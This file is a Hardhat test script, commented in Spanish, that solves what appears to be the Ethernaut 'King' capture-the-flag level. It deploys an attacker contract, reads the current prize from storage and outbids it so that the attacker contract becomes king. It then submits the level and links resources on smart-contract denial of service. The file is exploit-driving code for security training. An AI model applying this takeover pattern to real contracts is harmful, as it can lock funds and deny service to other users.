import { expect } from "chai";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { createChallenge, submitLevel } from "./utils";
import { Interface } from "ethers/lib/utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract;
const LEVEL_ADDRESS = "0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5";

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  //Contrato del challenge
  const challengeFactory = await ethers.getContractFactory(`King`);
  const challengeAddress = await createChallenge(
    LEVEL_ADDRESS,
    ethers.utils.parseEther('1')
  );
  challenge = challengeFactory.attach(challengeAddress);

  //Contrato atacante (Si fuera necesario)
  const attackerFactory = await ethers.getContractFactory(`Marquesi`);
  attacker = await attackerFactory.deploy();
});

describe("King Challenge", async ()=> {
  it("Resuelve el challenge - King", async ()=>{
    const prizeActual: BigNumber = BigNumber.from(await ethers.provider.getStorageAt(challenge.address,1));
    console.log(`El prize inicial del contrato king es: ${ethers.utils.formatEther(prizeActual)} ETH`);
    
    let txAtaque = await attacker.attack(challenge.address, {value: prizeActual.add(1)});
    await txAtaque.wait();
    
    expect(await challenge._king(), "EL KING NO COINCIDE CON CONTRATO MARQUESI").to.eq(attacker.address);
    console.log(`Marquesi.sol depositó ${ethers.utils.formatEther(prizeActual.add(1))} ETH y se convirtió en el Rey Sol Marquesi`);
  })
})

after(async () => {
  expect(await submitLevel(challenge.address), "DESAFÍO INCOMPLETO").to.be.true;
});

// Para entender más de DoS: https://arxiv.org/pdf/2012.14481.pdf --> Parte de Inter-Contractual Vulnerabilities
// Siempre hay un motivo para decir "Gracias tinchoabbate". Él explicando DoS: https://www.youtube.com/watch?v=CEzERbkVAhk
